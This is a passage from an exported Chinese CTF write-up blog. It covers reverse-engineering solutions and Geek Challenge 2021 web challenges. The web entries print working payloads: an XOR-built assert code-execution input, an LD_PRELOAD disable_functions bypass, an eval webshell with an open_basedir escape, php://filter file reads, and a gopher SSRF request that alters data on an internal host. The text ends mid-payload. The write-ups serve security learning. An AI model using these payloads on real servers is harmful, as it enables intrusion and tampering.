class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>],[<span class="hljs-string">&#x27;I&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>],[<span class="hljs-string">&#x27;Z&#x27;</span>,<span class="hljs-string">&#x27;z&#x27;</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> list1:<br>    str1=<span class="hljs-string">&#x27;&#x27;</span>.join(i)<br>    <span class="hljs-keyword">if</span> check(base64.b64decode(str1)):<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;The Flag is &quot;</span>+base64.b64decode(str1)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;not &quot;</span>+str1<br></code></pre></td></tr></table></figure>



<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="一张来自夏天的车票"><a href="#一张来自夏天的车票" class="headerlink" title="一张来自夏天的车票"></a>一张来自夏天的车票</h2><p>pyc文件，先进行反编译</p>
<p><code>uncompyle6 exp.pyc &gt; exp.py</code>失败，修复下文件</p>
<p>file看下版本，是3.6的</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxin-%E4%B8%80%E5%BC%A0%E6%9D%A5%E8%87%AA%E5%A4%8F%E5%A4%A9%E7%9A%84%E8%BD%A6%E7%A5%A8-1.png"></p>
<p>构造一个3.6生成的pyc文件与<code>exp.pyc</code>对比</p>
<p>会发现中间少了四个字节</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxin-%E4%B8%80%E5%BC%A0%E6%9D%A5%E8%87%AA%E5%A4%8F%E5%A4%A9%E7%9A%84%E8%BD%A6%E7%A5%A8-2.png"></p>
<p>填充上<code>00</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxin-%E4%B8%80%E5%BC%A0%E6%9D%A5%E8%87%AA%E5%A4%8F%E5%A4%A9%E7%9A%84%E8%BD%A6%E7%A5%A8-3.png"></p>
<p>反编译后运行得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># uncompyle6 version 3.8.0</span><br><span class="hljs-comment"># Python bytecode 3.6 (3379)</span><br><span class="hljs-comment"># Decompiled from: Python 3.9.2 (tags/v3.9.2:1a79785, Feb 19 2021, 13:44:55) [MSC v.1928 64 bit (AMD64)]</span><br><span class="hljs-comment"># Embedded file name: exp.py</span><br><span class="hljs-comment"># Compiled at: 2021-06-10 15:30:34</span><br><span class="hljs-keyword">import</span> base64<br>key = <span class="hljs-string">&#x27;e4b5e6d3-bc5a-475b-8c26-d3941ed9b90f&#x27;</span><br>enc = <span class="hljs-string">&#x27;XQdSA1YEV1IAAFMGUwAAA1AGAFkFBwcAAQQPVwRVXAxXDFFf&#x27;</span><br><span class="hljs-built_in">print</span>(key[(<span class="hljs-built_in">len</span>(key) - <span class="hljs-number">1</span>)])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode2</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">return</span> base64.urlsafe_b64decode(m)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode1</span>(<span class="hljs-params">m, key</span>):<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key) - <span class="hljs-number">6</span>):<br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(key[i]) ^ <span class="hljs-built_in">ord</span>(<span class="hljs-built_in">chr</span>(m[i])))<br><br>    <span class="hljs-keyword">return</span> flag<br><br><br><span class="hljs-built_in">print</span>(decode2(enc))<br>tmp = decode1(decode2(enc), key)<br><span class="hljs-built_in">print</span>(tmp)<br><span class="hljs-comment"># okay decompiling exp.pyc</span><br></code></pre></td></tr></table></figure>

<h2 id="啊？"><a href="#啊？" class="headerlink" title="啊？"></a>啊？</h2><p>安卓逆向题，先在模拟器上安装，找到验证函数</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-week2-%E5%95%8A%EF%BC%9F-1.png"></p>
<p>跳转到<code>check</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">M</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">T</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">check</span><span class="hljs-params">(String str)</span> &#123;<br>        String key;<br>        <span class="hljs-keyword">if</span> (str.length() != <span class="hljs-number">16</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>();<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            key = m0getey();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            key = getKey();<br>            System.arraycopy(key, <span class="hljs-number">0</span>, str, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>);<br>        &#125;<br>        <span class="hljs-type">int</span>[] iArr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">16</span>];<br>        iArr[<span class="hljs-number">0</span>] = <span class="hljs-number">42</span>;<br>        iArr[<span class="hljs-number">12</span>] = <span class="hljs-number">14</span>;<br>        iArr[<span class="hljs-number">10</span>] = <span class="hljs-number">7</span>;<br>        iArr[<span class="hljs-number">14</span>] = <span class="hljs-number">15</span>;<br>        iArr[<span class="hljs-number">15</span>] = <span class="hljs-number">17</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            iArr[<span class="hljs-number">1</span>] = <span class="hljs-number">43</span>;<br>            iArr[<span class="hljs-number">5</span>] = <span class="hljs-number">5</span>;<br>            System.out.println();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e2) &#123;<br>            iArr[<span class="hljs-number">5</span>] = <span class="hljs-number">37</span>;<br>            iArr[<span class="hljs-number">1</span>] = <span class="hljs-number">85</span>;<br>        &#125;<br>        iArr[<span class="hljs-number">6</span>] = <span class="hljs-number">15</span>;<br>        iArr[<span class="hljs-number">2</span>] = <span class="hljs-number">32</span>;<br>        iArr[<span class="hljs-number">3</span>] = <span class="hljs-number">23</span>;<br>        iArr[<span class="hljs-number">11</span>] = <span class="hljs-number">68</span>;<br>        iArr[<span class="hljs-number">4</span>] = <span class="hljs-number">85</span>;<br>        iArr[<span class="hljs-number">13</span>] = <span class="hljs-number">5</span>;<br>        iArr[<span class="hljs-number">9</span>] = <span class="hljs-number">7</span>;<br>        iArr[<span class="hljs-number">7</span>] = <span class="hljs-number">8</span>;<br>        iArr[<span class="hljs-number">8</span>] = <span class="hljs-number">22</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; str.length(); i++) &#123;<br>            <span class="hljs-keyword">if</span> ((iArr[i] &amp; <span class="hljs-number">255</span>) != ((str.charAt(i) ^ key.charAt(i % key.length())) &amp; <span class="hljs-number">255</span>)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>本题的关键就是最后那个if判断，会将输入的字符串与key进行异或，值存储在<code>iArr</code>数组里</p>
<p>从上面贴出代码的第八行跳转到<code>m0getey</code>函数获取key</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-week2-%E5%95%8A%EF%BC%9F-2.png"></p>
<p>解密脚本<br>将数组中的值和key逐个异或即可得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">v1 = [<span class="hljs-number">42</span>, <span class="hljs-number">43</span>, <span class="hljs-number">32</span>, <span class="hljs-number">23</span>, <span class="hljs-number">85</span>, <span class="hljs-number">5</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">22</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">68</span>, <span class="hljs-number">14</span>, <span class="hljs-number">5</span>, <span class="hljs-number">15</span>, <span class="hljs-number">17</span>]<br>key = <span class="hljs-string">&quot;anylab&quot;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((v1[x] &amp; <span class="hljs-number">255</span>) ^ (<span class="hljs-built_in">ord</span>(key[x % <span class="hljs-number">6</span>]) &amp; <span class="hljs-number">255</span>)), end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>奇安信</tag>
        <tag>培训</tag>
      </tags>
  </entry>
  <entry>
    <title>极客挑战2021-breakout-wp</title>
    <url>/wp/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982021-breakout-wp.html</url>
    <content><![CDATA[<h1 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// 这些奇怪的符号是什么呢?字符串之间还能异或的吗?</span><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v&#x27;</span>] ^ <span class="hljs-string">&#x27;!-__)^&#x27;</span>;<br><span class="hljs-comment">// ctf常见的验证码哦!纯数字呢</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;auth&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>) == <span class="hljs-string">&quot;666666&quot;</span>) &#123;<br>    <span class="hljs-variable">$a</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>

<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>代码会将<code>v</code>和<code>!-__)^</code>进行异或，所以我们需要构造出一个值，异或后为函数名<br>脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&quot;!-__)^&quot;</span><br>b=<span class="hljs-string">&quot;assert&quot;</span>        //需要的函数名<br>c=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    c+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(b[<span class="hljs-built_in">len</span>(c)])^<span class="hljs-built_in">ord</span>(i))<br><span class="hljs-built_in">print</span>(c)<br></code></pre></td></tr></table></figure>
<p>所以<code>v</code>的值就为<code>@^,:[*</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-1.png"></p>
<p>接下来是一个MD5的截断比较，找一个MD5后前6位为<code>666666</code>的值即可，例如<code>oT7mgbJMTNyh9qWYQT2d</code></p>
<p>code就是要执行的内容了</p>
<p>现在将三部分连接在一起<br>成功执行phpinfo<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-2.png"></p>
<h1 id="绕过disable-function"><a href="#绕过disable-function" class="headerlink" title="绕过disable_function"></a>绕过disable_function</h1><p>有了phpinfo，肯定要看一下<code>disable_functions</code><br>可以看到常用的system等基本都被禁用了</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,dl,<span class="hljs-keyword">exec</span>,<span class="hljs-keyword">system</span>,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,apache_setenv,<span class="hljs-keyword">symlink</span>,<span class="hljs-keyword">link</span>,error_log,iconv<br></code></pre></td></tr></table></figure>
<p>那么我们就需要绕过<code>disable_function</code><br>先用蚁剑连上，方便操作<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-3.png"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-4.png"></p>
<p>绕过disable_function有很多种方法，但这里大都被禁用了，所以最后采用的是利用 LD_PRELOAD 环境变量来绕过<br>首先下载<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">绕过代码</a><br>需要用到如下这4个文件<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-5.png"></p>
<blockquote>
<p>bypass_disablefunc.php：一个用来执行命令的 webshell。<br>bypass_disablefunc_x64.so或bypass_disablefunc_x86.so：执行命令的共享对象文件，分为64位的和32位的。<br>bypass_disablefunc.c：用来编译生成上面的共享对象文件。</p>
</blockquote>
<p>对于bypass_disablefunc.php，如果有权限就上传到web目录直接访问，无权限的话可以传到tmp目录后用include等函数来包含，并且需要用 GET 方法提供三个参数：</p>
<p>cmd 参数：待执行的系统命令，如 id 命令。<br>outpath 参数：保存命令执行输出结果的文件路径（如 &#x2F;tmp&#x2F;xx），便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点。<br>sopath 参数：指定劫持系统函数的共享对象的绝对路径（如 &#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。</p>
<p>在回过头来看题目，<code>/var/www/html</code>目录是没有权限的，<code>/tmp</code>目录可读可写，所以将文件上传到<code>/tmp</code>目录下<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-6.png"><br>在code中用文件包含调用<code>bypass_disablefunc.php</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-7.png"><br>然后GET传入三个参数<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-8.png"><br>会发现无法执行</p>
<p>检查一下bypass_disablefunc.php中的代码<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-9.png"><br>比较后发现<code>mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</code>中的mail被禁用了<br>可以使用<code>mail</code>的封装函数<code>mb_send_mail</code>来绕过<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-10.png"><br>成功绕过<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-11.png"><br>执行<code>ls /</code>后执行<code>/readflag</code>即可拿到flag<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-12.png"></p>
<h1 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h1><p>看到这个环境还不错，顺手试了一下绕过<code>open_basedir</code><br>因为是静态靶机，所以能看到其他师傅的马，直接包含，不用在上传了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;/tmp/test&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;/tmp/test&#x27;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]); <span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure>
<p>哈哈哈哈，在线聊天室<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-13.png"><br>蚁剑连接<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-14.png"><br>可以看到根目录文件了<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/breakout-15.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这一题考点很多，并没有表面那么简单，学到很多新姿势</p>
<p>特别鸣谢：<a href="https://l-helianthus.github.io/">@Hel1antHu5</a>师傅<br>参考文章：<a href="https://www.freebuf.com/articles/network/263540.html">绕过Disable Functions来搞事情</a></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>绕过</tag>
        <tag>web</tag>
        <tag>极客2021</tag>
      </tags>
  </entry>
  <entry>
    <title>极客挑战2021-期末不挂科就算成功-wp</title>
    <url>/wp/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982021-%E6%9C%9F%E6%9C%AB%E4%B8%8D%E6%8C%82%E7%A7%91%E5%B0%B1%E7%AE%97%E6%88%90%E5%8A%9F-wp.html</url>
    <content><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><blockquote>
<p>你挂科咯 试试打入学校内网来修改成绩吧(我命由我不由天系列)</p>
</blockquote>
<p>可以知道本题需要使用ssrf</p>
<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><p>在源代码中发现<code>debug.php</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982021-%E6%9C%9F%E6%9C%AB%E4%B8%8D%E6%8C%82%E7%A7%91%E5%B0%B1%E7%AE%97%E6%88%90%E5%8A%9F-1.png"></p>
<p>在debug.php中发现可以使用伪协议<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982021-%E6%9C%9F%E6%9C%AB%E4%B8%8D%E6%8C%82%E7%A7%91%E5%B0%B1%E7%AE%97%E6%88%90%E5%8A%9F-2.png"></p>
<p>传入<code>?file=php://filter/convert.base64-encode/resource=debug.php</code>查看debug.php的源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//debug.php关键源码</span><br><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;快去学习PHP伪协议&lt;/h1&gt;&quot;</span>;<br>	<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>	<span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;../&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;tp&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;input&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data&quot;</span>))&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;NO！！！&quot;</span>;<br>		<span class="hljs-keyword">exit</span>();<br>	&#125;<br>	<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>传入<code>?file=php://filter/convert.base64-encode/resource=index.php</code>查看index.php的源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php关键代码</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><span class="hljs-comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-comment">//你当前位于学校172.17.0.0/24网段下 其实还有台机子里面可以修改成绩 我偷偷告诉你password是123456,name是admin,//result必须要改成60 不然学校会查的！！！</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>从index.php中可以得出几个结论：<br>1：name为admin，password为123456，result为60<br>2：网段是172.17.0.0.&#x2F;24</p>
<p>再用伪协议查看当前主机的敏感文件<code>/etc/hosts</code>和<code>/proc/net/arp</code>,得到很多内网ip，fuzz一下，得到最终需要的一个内网ip<code>172.17.0.7</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982021-%E6%9C%9F%E6%9C%AB%E4%B8%8D%E6%8C%82%E7%A7%91%E5%B0%B1%E7%AE%97%E6%88%90%E5%8A%9F-3.png"></p>
<h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><p>既然知道了主机等信息，那么就可以开始构造ssrf了，使用gopher协议打<br>构造post包</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">106.55.154.252:8010</span>/?url=gopher://<span class="hljs-number">172.17.0.7:80</span>/_POST /index.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">172.17.0.7:80</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">36</span><br><br><span class="hljs-attribute">name</span>=admin&amp;password=<span class="hljs-number">123456</span>&amp;result=<span class="hljs-number">60</span><br></code></pre></td></tr></table></figure>
<p>将空格，冒号，等于用url编码，结尾换行用<code>%0d%0a</code>替换</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">106.55.154.252:8010</span>/?url=gopher://<span class="hljs-number">172.17.0.7:80</span>/_POST%<span class="hljs-number">20</span>/index.php%<span class="hljs-number">20</span>HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>AHost%<span class="hljs-number">3</span>A%<span class="hljs-number">20172</span>.<span class="hljs-number">17</span>.<span class="hljs-number">0</span>.<span class="hljs-number">7</span>%<span class="hljs-number">3</span>A80%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>AContent-Type%<span class="hljs-number">3</span>A%<span class="hljs-number">20</span>application/x-www-form-urlencoded%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>AContent-Length%<span class="hljs-number">3</span>A%<span class="hljs-number">2036</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aname%<span class="hljs-number">3</span>Dadmin%<span class="hljs-number">26</span>password%<span class="hljs-number">3</span>D123456%<span class="hljs-number">26</span>result%<span class="hljs-number">3</span>D60%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure>
<p>二次url编码：将_后的所有字符进行url编码</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">http:</span>//<span class="hljs-number">106.55</span>.<span class="hljs-number">154.252</span>:<span class="hljs-number">8010</span>/?url<span class="hljs-operator">=</span>gopher://<span class="hljs-number">172.17</span>.<span class="hljs-number">0.7</span>:<span class="hljs-number">80</span>/_<span class="hljs-variable">%50</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%53</span><span class="hljs-variable">%54</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%48</span><span class="hljs-variable">%54</span><span class="hljs-variable">%54</span><span class="hljs-variable">%50</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%31</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%48</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%31</span><span class="hljs-variable">%37</span><span class="hljs-variable">%32</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%31</span><span class="hljs-variable">%37</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%30</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%37</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%41</span><span class="hljs-variable">%38</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%43</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%54</span><span class="hljs-variable">%79</span><span class="hljs-variable">%70</span><span class="hljs-variable">%65</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%61</span><span class="hljs-variable">%70</span><span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%63</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%2</span>f<span class="hljs-variable">%78</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%72</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%2</span>d<span class="hljs-variable">%75</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%64</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%43</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%74</span><span class="hljs-variable">%68</span><span class="hljs-variable">%25</span><span 